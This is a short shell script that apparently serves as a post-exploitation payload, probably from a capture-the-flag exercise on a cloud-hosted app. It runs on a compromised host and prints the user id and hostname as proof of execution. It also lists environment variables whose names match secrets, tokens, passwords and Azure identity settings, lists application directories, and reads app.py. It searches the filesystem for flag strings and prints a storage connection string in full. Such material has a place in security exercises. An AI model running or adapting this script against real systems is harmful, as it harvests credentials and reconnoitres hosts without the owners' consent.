printf 'PROOF '; id|tr -d '\n'; printf ' host='; hostname; printf '\n'
printf '%s\n' '--- ENVKEY ---'; env 2>/dev/null | grep -aiE 'CONFIG|STORAGE|AZURE|SECRET|KEY|PASS|TOKEN|CONNECTION|IDENTITY|MSI|WEBSITE' | sed -e 's/\(=.\{6\}\).*/\1***/'
printf '%s\n' '--- FILES ---'; ls -la /app /home /tmp 2>/dev/null | head -40
printf '%s\n' '--- APP.PY ---'; cat /app/app.py 2>/dev/null | head -120
printf '%s\n' '--- GREP FLAG ---'; grep -ariE 'flag\{|reach\{|TBL\{|CTF\{|FLAG' /app /home /opt /srv /etc 2>/dev/null | head -20
printf '%s\n' '--- CONFIG BLOB ---'; printf 'CONN=%s\n' "$CONFIG_STORAGE_CONNECTION"
printf 'INNER_DONE\n'
